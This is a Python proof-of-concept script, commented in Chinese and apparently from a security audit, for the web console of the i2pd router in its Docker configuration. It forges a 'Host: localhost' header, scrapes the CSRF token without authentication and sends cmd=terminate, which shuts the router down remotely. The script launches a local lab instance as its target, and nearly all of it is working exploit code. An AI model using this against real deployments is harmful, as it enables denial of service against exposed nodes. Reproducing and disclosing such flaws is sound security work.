#!/usr/bin/env python3
"""
VULN-05 PoC — i2pd 官方 Docker 形态 webconsole 无认证远程关停演示
形态: contrib/docker/i2pd-docker.conf 绑 0.0.0.0:7070 + http.auth 默认 false
      + strictheaders 仅防 DNS rebinding (伪造 Host: localhost 即绕)
用法: python3 demo_webconsole.py   (需本机可运行 pristine 档 i2pd)
判定: 2 个 HTTP GET 后目标进程退出 → 复现成功
影响面: 官方 Docker 镜像 (216 万+ pulls) 所有做了端口映射/网络可达的部署
"""
import os, sys, time, subprocess, shutil, urllib.request

AUDIT = '/home/z/my-project/audit'
LAB = f'{AUDIT}/builds/lab-webconsole-demo'
IP = '21.0.19.150'
BIN = f'{AUDIT}/builds/pristine/i2pd'

def http_get(path):
    req = urllib.request.Request(f'http://{IP}:7070{path}', headers={'Host': 'localhost'})
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.status, r.read().decode(errors='replace')

def main():
    assert os.path.exists(BIN), '缺少 pristine 档 i2pd'
    subprocess.run('pkill -f "audit/builds/.*i2pd"; sleep 2', shell=True)
    shutil.rmtree(LAB, ignore_errors=True)
    os.makedirs(f'{LAB}/target')
    open(f'{LAB}/target.conf', 'w').write(
        f'loglevel = info\nhost = {IP}\n[reseed]\nurls =\n'
        f'[http]\naddress = 0.0.0.0\nport = 7070\n')   # 官方 Docker 镜像同款绑定
    print('[*] 启动目标 (0.0.0.0:7070, 无认证 — 官方镜像形态)')
    target = subprocess.Popen([BIN, f'--datadir={LAB}/target', f'--conf={LAB}/target.conf'],
        stdout=open(f'{LAB}/target.log', 'w'), stderr=subprocess.STDOUT)
    for _ in range(30):
        time.sleep(1)
        try:
            http_get('/'); break
        except Exception: pass

    print('[*] GET #1: 无认证获取命令页与 CSRF token')
    st, page = http_get('/?page=commands')
    import re
    m = re.search(r'cmd=terminate&token=(\d+)', page)
    assert m, 'token 提取失败'
    token = m.group(1)
    print(f'    token={token} (无需任何凭据)')
    print('[*] GET #2: cmd=terminate 强制关停')
    st, _ = http_get(f'/?cmd=terminate&token={token}')
    print(f'    HTTP {st}')
    for i in range(10):
        time.sleep(1)
        if target.poll() is not None:
            print(f'\n[+] 复现成功 — 目标被两个无认证 GET 远程关停 (t+{i+1}s)')
            return 0
    print('\n[-] 目标未退出')
    return 1

if __name__ == '__main__':
    sys.exit(main())
